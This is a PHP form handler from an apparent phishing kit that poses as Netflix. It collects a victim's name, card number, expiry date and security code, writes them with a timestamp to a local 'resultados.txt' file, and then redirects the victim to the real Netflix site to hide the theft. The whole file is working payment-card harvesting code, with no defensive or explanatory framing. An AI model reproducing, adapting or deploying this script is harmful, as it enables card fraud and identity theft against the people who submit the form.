<?php
$nombre = $_POST['nombre'];
$apellido = $_POST['apellido'];
$TarjetaNumero = $_POST['TarjetaNumero'];
$FechaVencimiento = $_POST['FechaVencimiento'];
$codigo = $_POST['codigo'];
$_SESSION['_ip_'] = $_SERVER['REMOTE_ADDR'];
$fecha = date("d/m/y g:i:s");
$file = fopen ('resultados.txt', 'at');
fwrite($file, "nombre: $nombre | apellido: $apellido | TarjetaNumero: $TarjetaNumero | FechaVencimiento: $FechaVencimiento | codigo: $codigo | fecha: $fecha |ip $\n");
fclose($file);
header("location:https://www.netflix.com/");

?>